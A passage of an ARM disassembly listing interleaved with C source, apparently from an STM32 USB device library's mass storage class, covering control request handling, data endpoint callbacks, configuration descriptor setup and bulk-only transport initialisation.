 8008f6c:	683b      	ldr	r3, [r7, #0]
 8008f6e:	781b      	ldrb	r3, [r3, #0]
 8008f70:	f003 0360 	and.w	r3, r3, #96	; 0x60
 8008f74:	2b00      	cmp	r3, #0
 8008f76:	d053      	beq.n	8009020 <USBD_MSC_Setup+0xe0>
 8008f78:	2b20      	cmp	r3, #32
 8008f7a:	f040 80d1 	bne.w	8009120 <USBD_MSC_Setup+0x1e0>
  {
    /* Class request */
    case USB_REQ_TYPE_CLASS:
      switch (req->bRequest)
 8008f7e:	683b      	ldr	r3, [r7, #0]
 8008f80:	785b      	ldrb	r3, [r3, #1]
 8008f82:	2bfe      	cmp	r3, #254	; 0xfe
 8008f84:	d002      	beq.n	8008f8c <USBD_MSC_Setup+0x4c>
 8008f86:	2bff      	cmp	r3, #255	; 0xff
 8008f88:	d02a      	beq.n	8008fe0 <USBD_MSC_Setup+0xa0>
 8008f8a:	e041      	b.n	8009010 <USBD_MSC_Setup+0xd0>
      {
        case BOT_GET_MAX_LUN:
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 8008f8c:	683b      	ldr	r3, [r7, #0]
 8008f8e:	885b      	ldrh	r3, [r3, #2]
 8008f90:	2b00      	cmp	r3, #0
 8008f92:	d11e      	bne.n	8008fd2 <USBD_MSC_Setup+0x92>
 8008f94:	683b      	ldr	r3, [r7, #0]
 8008f96:	88db      	ldrh	r3, [r3, #6]
 8008f98:	2b01      	cmp	r3, #1
 8008f9a:	d11a      	bne.n	8008fd2 <USBD_MSC_Setup+0x92>
              ((req->bmRequest & 0x80U) == 0x80U))
 8008f9c:	683b      	ldr	r3, [r7, #0]
 8008f9e:	781b      	ldrb	r3, [r3, #0]
 8008fa0:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 1U) &&
 8008fa2:	2b00      	cmp	r3, #0
 8008fa4:	da15      	bge.n	8008fd2 <USBD_MSC_Setup+0x92>
          {
            hmsc->max_lun = (uint32_t)((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->GetMaxLun();
 8008fa6:	687b      	ldr	r3, [r7, #4]
 8008fa8:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8008fac:	687a      	ldr	r2, [r7, #4]
 8008fae:	33b0      	adds	r3, #176	; 0xb0
 8008fb0:	009b      	lsls	r3, r3, #2
 8008fb2:	4413      	add	r3, r2
 8008fb4:	685b      	ldr	r3, [r3, #4]
 8008fb6:	699b      	ldr	r3, [r3, #24]
 8008fb8:	4798      	blx	r3
 8008fba:	4603      	mov	r3, r0
 8008fbc:	461a      	mov	r2, r3
 8008fbe:	693b      	ldr	r3, [r7, #16]
 8008fc0:	601a      	str	r2, [r3, #0]
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->max_lun, 1U);
 8008fc2:	693b      	ldr	r3, [r7, #16]
 8008fc4:	2201      	movs	r2, #1
 8008fc6:	4619      	mov	r1, r3
 8008fc8:	6878      	ldr	r0, [r7, #4]
 8008fca:	f003 f979 	bl	800c2c0 <USBD_CtlSendData>
 8008fce:	bf00      	nop
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8008fd0:	e025      	b.n	800901e <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 8008fd2:	6839      	ldr	r1, [r7, #0]
 8008fd4:	6878      	ldr	r0, [r7, #4]
 8008fd6:	f003 f902 	bl	800c1de <USBD_CtlError>
            ret = USBD_FAIL;
 8008fda:	2303      	movs	r3, #3
 8008fdc:	75fb      	strb	r3, [r7, #23]
          break;
 8008fde:	e01e      	b.n	800901e <USBD_MSC_Setup+0xde>

        case BOT_RESET :
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 8008fe0:	683b      	ldr	r3, [r7, #0]
 8008fe2:	885b      	ldrh	r3, [r3, #2]
 8008fe4:	2b00      	cmp	r3, #0
 8008fe6:	d10c      	bne.n	8009002 <USBD_MSC_Setup+0xc2>
 8008fe8:	683b      	ldr	r3, [r7, #0]
 8008fea:	88db      	ldrh	r3, [r3, #6]
 8008fec:	2b00      	cmp	r3, #0
 8008fee:	d108      	bne.n	8009002 <USBD_MSC_Setup+0xc2>
              ((req->bmRequest & 0x80U) != 0x80U))
 8008ff0:	683b      	ldr	r3, [r7, #0]
 8008ff2:	781b      	ldrb	r3, [r3, #0]
 8008ff4:	b25b      	sxtb	r3, r3
          if ((req->wValue  == 0U) && (req->wLength == 0U) &&
 8008ff6:	2b00      	cmp	r3, #0
 8008ff8:	db03      	blt.n	8009002 <USBD_MSC_Setup+0xc2>
          {
            MSC_BOT_Reset(pdev);
 8008ffa:	6878      	ldr	r0, [r7, #4]
 8008ffc:	f000 f9bc 	bl	8009378 <MSC_BOT_Reset>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 8009000:	e00d      	b.n	800901e <USBD_MSC_Setup+0xde>
            USBD_CtlError(pdev, req);
 8009002:	6839      	ldr	r1, [r7, #0]
 8009004:	6878      	ldr	r0, [r7, #4]
 8009006:	f003 f8ea 	bl	800c1de <USBD_CtlError>
            ret = USBD_FAIL;
 800900a:	2303      	movs	r3, #3
 800900c:	75fb      	strb	r3, [r7, #23]
          break;
 800900e:	e006      	b.n	800901e <USBD_MSC_Setup+0xde>

        default:
          USBD_CtlError(pdev, req);
 8009010:	6839      	ldr	r1, [r7, #0]
 8009012:	6878      	ldr	r0, [r7, #4]
 8009014:	f003 f8e3 	bl	800c1de <USBD_CtlError>
          ret = USBD_FAIL;
 8009018:	2303      	movs	r3, #3
 800901a:	75fb      	strb	r3, [r7, #23]
          break;
 800901c:	bf00      	nop
      }
      break;
 800901e:	e086      	b.n	800912e <USBD_MSC_Setup+0x1ee>
    /* Interface & Endpoint request */
    case USB_REQ_TYPE_STANDARD:
      switch (req->bRequest)
 8009020:	683b      	ldr	r3, [r7, #0]
 8009022:	785b      	ldrb	r3, [r3, #1]
 8009024:	2b0b      	cmp	r3, #11
 8009026:	d872      	bhi.n	800910e <USBD_MSC_Setup+0x1ce>
 8009028:	a201      	add	r2, pc, #4	; (adr r2, 8009030 <USBD_MSC_Setup+0xf0>)
 800902a:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800902e:	bf00      	nop
 8009030:	08009061 	.word	0x08009061
 8009034:	080090dd 	.word	0x080090dd
 8009038:	0800910f 	.word	0x0800910f
 800903c:	0800910f 	.word	0x0800910f
 8009040:	0800910f 	.word	0x0800910f
 8009044:	0800910f 	.word	0x0800910f
 8009048:	0800910f 	.word	0x0800910f
 800904c:	0800910f 	.word	0x0800910f
 8009050:	0800910f 	.word	0x0800910f
 8009054:	0800910f 	.word	0x0800910f
 8009058:	0800908b 	.word	0x0800908b
 800905c:	080090b5 	.word	0x080090b5
      {
        case USB_REQ_GET_STATUS:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 8009060:	687b      	ldr	r3, [r7, #4]
 8009062:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8009066:	b2db      	uxtb	r3, r3
 8009068:	2b03      	cmp	r3, #3
 800906a:	d107      	bne.n	800907c <USBD_MSC_Setup+0x13c>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&status_info, 2U);
 800906c:	f107 030e 	add.w	r3, r7, #14
 8009070:	2202      	movs	r2, #2
 8009072:	4619      	mov	r1, r3
 8009074:	6878      	ldr	r0, [r7, #4]
 8009076:	f003 f923 	bl	800c2c0 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 800907a:	e050      	b.n	800911e <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 800907c:	6839      	ldr	r1, [r7, #0]
 800907e:	6878      	ldr	r0, [r7, #4]
 8009080:	f003 f8ad 	bl	800c1de <USBD_CtlError>
            ret = USBD_FAIL;
 8009084:	2303      	movs	r3, #3
 8009086:	75fb      	strb	r3, [r7, #23]
          break;
 8009088:	e049      	b.n	800911e <USBD_MSC_Setup+0x1de>

        case USB_REQ_GET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 800908a:	687b      	ldr	r3, [r7, #4]
 800908c:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 8009090:	b2db      	uxtb	r3, r3
 8009092:	2b03      	cmp	r3, #3
 8009094:	d107      	bne.n	80090a6 <USBD_MSC_Setup+0x166>
          {
            (void)USBD_CtlSendData(pdev, (uint8_t *)&hmsc->interface, 1U);
 8009096:	693b      	ldr	r3, [r7, #16]
 8009098:	3304      	adds	r3, #4
 800909a:	2201      	movs	r2, #1
 800909c:	4619      	mov	r1, r3
 800909e:	6878      	ldr	r0, [r7, #4]
 80090a0:	f003 f90e 	bl	800c2c0 <USBD_CtlSendData>
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80090a4:	e03b      	b.n	800911e <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 80090a6:	6839      	ldr	r1, [r7, #0]
 80090a8:	6878      	ldr	r0, [r7, #4]
 80090aa:	f003 f898 	bl	800c1de <USBD_CtlError>
            ret = USBD_FAIL;
 80090ae:	2303      	movs	r3, #3
 80090b0:	75fb      	strb	r3, [r7, #23]
          break;
 80090b2:	e034      	b.n	800911e <USBD_MSC_Setup+0x1de>

        case USB_REQ_SET_INTERFACE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80090b4:	687b      	ldr	r3, [r7, #4]
 80090b6:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80090ba:	b2db      	uxtb	r3, r3
 80090bc:	2b03      	cmp	r3, #3
 80090be:	d106      	bne.n	80090ce <USBD_MSC_Setup+0x18e>
          {
            hmsc->interface = (uint8_t)(req->wValue);
 80090c0:	683b      	ldr	r3, [r7, #0]
 80090c2:	885b      	ldrh	r3, [r3, #2]
 80090c4:	b2db      	uxtb	r3, r3
 80090c6:	461a      	mov	r2, r3
 80090c8:	693b      	ldr	r3, [r7, #16]
 80090ca:	605a      	str	r2, [r3, #4]
          else
          {
            USBD_CtlError(pdev, req);
            ret = USBD_FAIL;
          }
          break;
 80090cc:	e027      	b.n	800911e <USBD_MSC_Setup+0x1de>
            USBD_CtlError(pdev, req);
 80090ce:	6839      	ldr	r1, [r7, #0]
 80090d0:	6878      	ldr	r0, [r7, #4]
 80090d2:	f003 f884 	bl	800c1de <USBD_CtlError>
            ret = USBD_FAIL;
 80090d6:	2303      	movs	r3, #3
 80090d8:	75fb      	strb	r3, [r7, #23]
          break;
 80090da:	e020      	b.n	800911e <USBD_MSC_Setup+0x1de>

        case USB_REQ_CLEAR_FEATURE:
          if (pdev->dev_state == USBD_STATE_CONFIGURED)
 80090dc:	687b      	ldr	r3, [r7, #4]
 80090de:	f893 329c 	ldrb.w	r3, [r3, #668]	; 0x29c
 80090e2:	b2db      	uxtb	r3, r3
 80090e4:	2b03      	cmp	r3, #3
 80090e6:	d119      	bne.n	800911c <USBD_MSC_Setup+0x1dc>
          {
            if (req->wValue == USB_FEATURE_EP_HALT)
 80090e8:	683b      	ldr	r3, [r7, #0]
 80090ea:	885b      	ldrh	r3, [r3, #2]
 80090ec:	2b00      	cmp	r3, #0
 80090ee:	d115      	bne.n	800911c <USBD_MSC_Setup+0x1dc>
            {
              /* Flush the FIFO */
              (void)USBD_LL_FlushEP(pdev, (uint8_t)req->wIndex);
 80090f0:	683b      	ldr	r3, [r7, #0]
 80090f2:	889b      	ldrh	r3, [r3, #4]
 80090f4:	b2db      	uxtb	r3, r3
 80090f6:	4619      	mov	r1, r3
 80090f8:	6878      	ldr	r0, [r7, #4]
 80090fa:	f003 fdad 	bl	800cc58 <USBD_LL_FlushEP>

              /* Handle BOT error */
              MSC_BOT_CplClrFeature(pdev, (uint8_t)req->wIndex);
 80090fe:	683b      	ldr	r3, [r7, #0]
 8009100:	889b      	ldrh	r3, [r3, #4]
 8009102:	b2db      	uxtb	r3, r3
 8009104:	4619      	mov	r1, r3
 8009106:	6878      	ldr	r0, [r7, #4]
 8009108:	f000 fb54 	bl	80097b4 <MSC_BOT_CplClrFeature>
            }
          }
          break;
 800910c:	e006      	b.n	800911c <USBD_MSC_Setup+0x1dc>

        default:
          USBD_CtlError(pdev, req);
 800910e:	6839      	ldr	r1, [r7, #0]
 8009110:	6878      	ldr	r0, [r7, #4]
 8009112:	f003 f864 	bl	800c1de <USBD_CtlError>
          ret = USBD_FAIL;
 8009116:	2303      	movs	r3, #3
 8009118:	75fb      	strb	r3, [r7, #23]
          break;
 800911a:	e000      	b.n	800911e <USBD_MSC_Setup+0x1de>
          break;
 800911c:	bf00      	nop
      }
      break;
 800911e:	e006      	b.n	800912e <USBD_MSC_Setup+0x1ee>

    default:
      USBD_CtlError(pdev, req);
 8009120:	6839      	ldr	r1, [r7, #0]
 8009122:	6878      	ldr	r0, [r7, #4]
 8009124:	f003 f85b 	bl	800c1de <USBD_CtlError>
      ret = USBD_FAIL;
 8009128:	2303      	movs	r3, #3
 800912a:	75fb      	strb	r3, [r7, #23]
      break;
 800912c:	bf00      	nop
  }

  return (uint8_t)ret;
 800912e:	7dfb      	ldrb	r3, [r7, #23]
}
 8009130:	4618      	mov	r0, r3
 8009132:	3718      	adds	r7, #24
 8009134:	46bd      	mov	sp, r7
 8009136:	bd80      	pop	{r7, pc}

08009138 <USBD_MSC_DataIn>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataIn(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009138:	b580      	push	{r7, lr}
 800913a:	b082      	sub	sp, #8
 800913c:	af00      	add	r7, sp, #0
 800913e:	6078      	str	r0, [r7, #4]
 8009140:	460b      	mov	r3, r1
 8009142:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataIn(pdev, epnum);
 8009144:	78fb      	ldrb	r3, [r7, #3]
 8009146:	4619      	mov	r1, r3
 8009148:	6878      	ldr	r0, [r7, #4]
 800914a:	f000 f961 	bl	8009410 <MSC_BOT_DataIn>

  return (uint8_t)USBD_OK;
 800914e:	2300      	movs	r3, #0
}
 8009150:	4618      	mov	r0, r3
 8009152:	3708      	adds	r7, #8
 8009154:	46bd      	mov	sp, r7
 8009156:	bd80      	pop	{r7, pc}

08009158 <USBD_MSC_DataOut>:
  * @param  pdev: device instance
  * @param  epnum: endpoint index
  * @retval status
  */
uint8_t USBD_MSC_DataOut(USBD_HandleTypeDef *pdev, uint8_t epnum)
{
 8009158:	b580      	push	{r7, lr}
 800915a:	b082      	sub	sp, #8
 800915c:	af00      	add	r7, sp, #0
 800915e:	6078      	str	r0, [r7, #4]
 8009160:	460b      	mov	r3, r1
 8009162:	70fb      	strb	r3, [r7, #3]
  MSC_BOT_DataOut(pdev, epnum);
 8009164:	78fb      	ldrb	r3, [r7, #3]
 8009166:	4619      	mov	r1, r3
 8009168:	6878      	ldr	r0, [r7, #4]
 800916a:	f000 f98d 	bl	8009488 <MSC_BOT_DataOut>

  return (uint8_t)USBD_OK;
 800916e:	2300      	movs	r3, #0
}
 8009170:	4618      	mov	r0, r3
 8009172:	3708      	adds	r7, #8
 8009174:	46bd      	mov	sp, r7
 8009176:	bd80      	pop	{r7, pc}

08009178 <USBD_MSC_GetHSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetHSCfgDesc(uint16_t *length)
{
 8009178:	b580      	push	{r7, lr}
 800917a:	b084      	sub	sp, #16
 800917c:	af00      	add	r7, sp, #0
 800917e:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 8009180:	2181      	movs	r1, #129	; 0x81
 8009182:	4812      	ldr	r0, [pc, #72]	; (80091cc <USBD_MSC_GetHSCfgDesc+0x54>)
 8009184:	f002 f9c8 	bl	800b518 <USBD_GetEpDesc>
 8009188:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 800918a:	2101      	movs	r1, #1
 800918c:	480f      	ldr	r0, [pc, #60]	; (80091cc <USBD_MSC_GetHSCfgDesc+0x54>)
 800918e:	f002 f9c3 	bl	800b518 <USBD_GetEpDesc>
 8009192:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009194:	68fb      	ldr	r3, [r7, #12]
 8009196:	2b00      	cmp	r3, #0
 8009198:	d006      	beq.n	80091a8 <USBD_MSC_GetHSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 800919a:	68fb      	ldr	r3, [r7, #12]
 800919c:	2200      	movs	r2, #0
 800919e:	711a      	strb	r2, [r3, #4]
 80091a0:	2200      	movs	r2, #0
 80091a2:	f042 0202 	orr.w	r2, r2, #2
 80091a6:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 80091a8:	68bb      	ldr	r3, [r7, #8]
 80091aa:	2b00      	cmp	r3, #0
 80091ac:	d006      	beq.n	80091bc <USBD_MSC_GetHSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_HS_PACKET;
 80091ae:	68bb      	ldr	r3, [r7, #8]
 80091b0:	2200      	movs	r2, #0
 80091b2:	711a      	strb	r2, [r3, #4]
 80091b4:	2200      	movs	r2, #0
 80091b6:	f042 0202 	orr.w	r2, r2, #2
 80091ba:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 80091bc:	687b      	ldr	r3, [r7, #4]
 80091be:	2220      	movs	r2, #32
 80091c0:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 80091c2:	4b02      	ldr	r3, [pc, #8]	; (80091cc <USBD_MSC_GetHSCfgDesc+0x54>)
}
 80091c4:	4618      	mov	r0, r3
 80091c6:	3710      	adds	r7, #16
 80091c8:	46bd      	mov	sp, r7
 80091ca:	bd80      	pop	{r7, pc}
 80091cc:	200000e0 	.word	0x200000e0

080091d0 <USBD_MSC_GetFSCfgDesc>:
  *         return configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetFSCfgDesc(uint16_t *length)
{
 80091d0:	b580      	push	{r7, lr}
 80091d2:	b084      	sub	sp, #16
 80091d4:	af00      	add	r7, sp, #0
 80091d6:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 80091d8:	2181      	movs	r1, #129	; 0x81
 80091da:	4812      	ldr	r0, [pc, #72]	; (8009224 <USBD_MSC_GetFSCfgDesc+0x54>)
 80091dc:	f002 f99c 	bl	800b518 <USBD_GetEpDesc>
 80091e0:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 80091e2:	2101      	movs	r1, #1
 80091e4:	480f      	ldr	r0, [pc, #60]	; (8009224 <USBD_MSC_GetFSCfgDesc+0x54>)
 80091e6:	f002 f997 	bl	800b518 <USBD_GetEpDesc>
 80091ea:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 80091ec:	68fb      	ldr	r3, [r7, #12]
 80091ee:	2b00      	cmp	r3, #0
 80091f0:	d006      	beq.n	8009200 <USBD_MSC_GetFSCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 80091f2:	68fb      	ldr	r3, [r7, #12]
 80091f4:	2200      	movs	r2, #0
 80091f6:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 80091fa:	711a      	strb	r2, [r3, #4]
 80091fc:	2200      	movs	r2, #0
 80091fe:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 8009200:	68bb      	ldr	r3, [r7, #8]
 8009202:	2b00      	cmp	r3, #0
 8009204:	d006      	beq.n	8009214 <USBD_MSC_GetFSCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 8009206:	68bb      	ldr	r3, [r7, #8]
 8009208:	2200      	movs	r2, #0
 800920a:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 800920e:	711a      	strb	r2, [r3, #4]
 8009210:	2200      	movs	r2, #0
 8009212:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 8009214:	687b      	ldr	r3, [r7, #4]
 8009216:	2220      	movs	r2, #32
 8009218:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 800921a:	4b02      	ldr	r3, [pc, #8]	; (8009224 <USBD_MSC_GetFSCfgDesc+0x54>)
}
 800921c:	4618      	mov	r0, r3
 800921e:	3710      	adds	r7, #16
 8009220:	46bd      	mov	sp, r7
 8009222:	bd80      	pop	{r7, pc}
 8009224:	200000e0 	.word	0x200000e0

08009228 <USBD_MSC_GetOtherSpeedCfgDesc>:
  *         return other speed configuration descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetOtherSpeedCfgDesc(uint16_t *length)
{
 8009228:	b580      	push	{r7, lr}
 800922a:	b084      	sub	sp, #16
 800922c:	af00      	add	r7, sp, #0
 800922e:	6078      	str	r0, [r7, #4]
  USBD_EpDescTypeDef *pEpInDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPIN_ADDR);
 8009230:	2181      	movs	r1, #129	; 0x81
 8009232:	4812      	ldr	r0, [pc, #72]	; (800927c <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 8009234:	f002 f970 	bl	800b518 <USBD_GetEpDesc>
 8009238:	60f8      	str	r0, [r7, #12]
  USBD_EpDescTypeDef *pEpOutDesc = USBD_GetEpDesc(USBD_MSC_CfgDesc, MSC_EPOUT_ADDR);
 800923a:	2101      	movs	r1, #1
 800923c:	480f      	ldr	r0, [pc, #60]	; (800927c <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
 800923e:	f002 f96b 	bl	800b518 <USBD_GetEpDesc>
 8009242:	60b8      	str	r0, [r7, #8]

  if (pEpInDesc != NULL)
 8009244:	68fb      	ldr	r3, [r7, #12]
 8009246:	2b00      	cmp	r3, #0
 8009248:	d006      	beq.n	8009258 <USBD_MSC_GetOtherSpeedCfgDesc+0x30>
  {
    pEpInDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 800924a:	68fb      	ldr	r3, [r7, #12]
 800924c:	2200      	movs	r2, #0
 800924e:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8009252:	711a      	strb	r2, [r3, #4]
 8009254:	2200      	movs	r2, #0
 8009256:	715a      	strb	r2, [r3, #5]
  }

  if (pEpOutDesc != NULL)
 8009258:	68bb      	ldr	r3, [r7, #8]
 800925a:	2b00      	cmp	r3, #0
 800925c:	d006      	beq.n	800926c <USBD_MSC_GetOtherSpeedCfgDesc+0x44>
  {
    pEpOutDesc->wMaxPacketSize = MSC_MAX_FS_PACKET;
 800925e:	68bb      	ldr	r3, [r7, #8]
 8009260:	2200      	movs	r2, #0
 8009262:	f042 0240 	orr.w	r2, r2, #64	; 0x40
 8009266:	711a      	strb	r2, [r3, #4]
 8009268:	2200      	movs	r2, #0
 800926a:	715a      	strb	r2, [r3, #5]
  }

  *length = (uint16_t)sizeof(USBD_MSC_CfgDesc);
 800926c:	687b      	ldr	r3, [r7, #4]
 800926e:	2220      	movs	r2, #32
 8009270:	801a      	strh	r2, [r3, #0]
  return USBD_MSC_CfgDesc;
 8009272:	4b02      	ldr	r3, [pc, #8]	; (800927c <USBD_MSC_GetOtherSpeedCfgDesc+0x54>)
}
 8009274:	4618      	mov	r0, r3
 8009276:	3710      	adds	r7, #16
 8009278:	46bd      	mov	sp, r7
 800927a:	bd80      	pop	{r7, pc}
 800927c:	200000e0 	.word	0x200000e0

08009280 <USBD_MSC_GetDeviceQualifierDescriptor>:
  *         return Device Qualifier descriptor
  * @param  length : pointer data length
  * @retval pointer to descriptor buffer
  */
uint8_t *USBD_MSC_GetDeviceQualifierDescriptor(uint16_t *length)
{
 8009280:	b480      	push	{r7}
 8009282:	b083      	sub	sp, #12
 8009284:	af00      	add	r7, sp, #0
 8009286:	6078      	str	r0, [r7, #4]
  *length = (uint16_t)sizeof(USBD_MSC_DeviceQualifierDesc);
 8009288:	687b      	ldr	r3, [r7, #4]
 800928a:	220a      	movs	r2, #10
 800928c:	801a      	strh	r2, [r3, #0]

  return USBD_MSC_DeviceQualifierDesc;
 800928e:	4b03      	ldr	r3, [pc, #12]	; (800929c <USBD_MSC_GetDeviceQualifierDescriptor+0x1c>)
}
 8009290:	4618      	mov	r0, r3
 8009292:	370c      	adds	r7, #12
 8009294:	46bd      	mov	sp, r7
 8009296:	f85d 7b04 	ldr.w	r7, [sp], #4
 800929a:	4770      	bx	lr
 800929c:	20000100 	.word	0x20000100

080092a0 <USBD_MSC_RegisterStorage>:
  * @brief  USBD_MSC_RegisterStorage
  * @param  fops: storage callback
  * @retval status
  */
uint8_t USBD_MSC_RegisterStorage(USBD_HandleTypeDef *pdev, USBD_StorageTypeDef *fops)
{
 80092a0:	b480      	push	{r7}
 80092a2:	b083      	sub	sp, #12
 80092a4:	af00      	add	r7, sp, #0
 80092a6:	6078      	str	r0, [r7, #4]
 80092a8:	6039      	str	r1, [r7, #0]
  if (fops == NULL)
 80092aa:	683b      	ldr	r3, [r7, #0]
 80092ac:	2b00      	cmp	r3, #0
 80092ae:	d101      	bne.n	80092b4 <USBD_MSC_RegisterStorage+0x14>
  {
    return (uint8_t)USBD_FAIL;
 80092b0:	2303      	movs	r3, #3
 80092b2:	e009      	b.n	80092c8 <USBD_MSC_RegisterStorage+0x28>
  }

  pdev->pUserData[pdev->classId] = fops;
 80092b4:	687b      	ldr	r3, [r7, #4]
 80092b6:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 80092ba:	687a      	ldr	r2, [r7, #4]
 80092bc:	33b0      	adds	r3, #176	; 0xb0
 80092be:	009b      	lsls	r3, r3, #2
 80092c0:	4413      	add	r3, r2
 80092c2:	683a      	ldr	r2, [r7, #0]
 80092c4:	605a      	str	r2, [r3, #4]

  return (uint8_t)USBD_OK;
 80092c6:	2300      	movs	r3, #0
}
 80092c8:	4618      	mov	r0, r3
 80092ca:	370c      	adds	r7, #12
 80092cc:	46bd      	mov	sp, r7
 80092ce:	f85d 7b04 	ldr.w	r7, [sp], #4
 80092d2:	4770      	bx	lr

080092d4 <MSC_BOT_Init>:
  *         Initialize the BOT Process
  * @param  pdev: device instance
  * @retval None
  */
void MSC_BOT_Init(USBD_HandleTypeDef *pdev)
{
 80092d4:	b580      	push	{r7, lr}
 80092d6:	b084      	sub	sp, #16
 80092d8:	af00      	add	r7, sp, #0
 80092da:	6078      	str	r0, [r7, #4]
  USBD_MSC_BOT_HandleTypeDef *hmsc = (USBD_MSC_BOT_HandleTypeDef *)pdev->pClassDataCmsit[pdev->classId];
 80092dc:	687b      	ldr	r3, [r7, #4]
 80092de:	f8d3 22d4 	ldr.w	r2, [r3, #724]	; 0x2d4
 80092e2:	687b      	ldr	r3, [r7, #4]
 80092e4:	32b0      	adds	r2, #176	; 0xb0
 80092e6:	f853 3022 	ldr.w	r3, [r3, r2, lsl #2]
 80092ea:	60fb      	str	r3, [r7, #12]
  /* Get the Endpoints addresses allocated for this class instance */
  MSCInEpAdd  = USBD_CoreGetEPAdd(pdev, USBD_EP_IN, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
  MSCOutEpAdd = USBD_CoreGetEPAdd(pdev, USBD_EP_OUT, USBD_EP_TYPE_BULK, (uint8_t)pdev->classId);
#endif /* USE_USBD_COMPOSITE */

  if (hmsc == NULL)
 80092ec:	68fb      	ldr	r3, [r7, #12]
 80092ee:	2b00      	cmp	r3, #0
 80092f0:	d039      	beq.n	8009366 <MSC_BOT_Init+0x92>
  {
    return;
  }

  hmsc->bot_state = USBD_BOT_IDLE;
 80092f2:	68fb      	ldr	r3, [r7, #12]
 80092f4:	2200      	movs	r2, #0
 80092f6:	721a      	strb	r2, [r3, #8]
  hmsc->bot_status = USBD_BOT_STATUS_NORMAL;
 80092f8:	68fb      	ldr	r3, [r7, #12]
 80092fa:	2200      	movs	r2, #0
 80092fc:	725a      	strb	r2, [r3, #9]

  hmsc->scsi_sense_tail = 0U;
 80092fe:	68fb      	ldr	r3, [r7, #12]
 8009300:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009304:	2200      	movs	r2, #0
 8009306:	f883 2061 	strb.w	r2, [r3, #97]	; 0x61
  hmsc->scsi_sense_head = 0U;
 800930a:	68fb      	ldr	r3, [r7, #12]
 800930c:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 8009310:	2200      	movs	r2, #0
 8009312:	f883 2060 	strb.w	r2, [r3, #96]	; 0x60
  hmsc->scsi_medium_state = SCSI_MEDIUM_UNLOCKED;
 8009316:	68fb      	ldr	r3, [r7, #12]
 8009318:	f503 5380 	add.w	r3, r3, #4096	; 0x1000
 800931c:	2200      	movs	r2, #0
 800931e:	f883 2062 	strb.w	r2, [r3, #98]	; 0x62

  ((USBD_StorageTypeDef *)pdev->pUserData[pdev->classId])->Init(0U);
 8009322:	687b      	ldr	r3, [r7, #4]
 8009324:	f8d3 32d4 	ldr.w	r3, [r3, #724]	; 0x2d4
 8009328:	687a      	ldr	r2, [r7, #4]
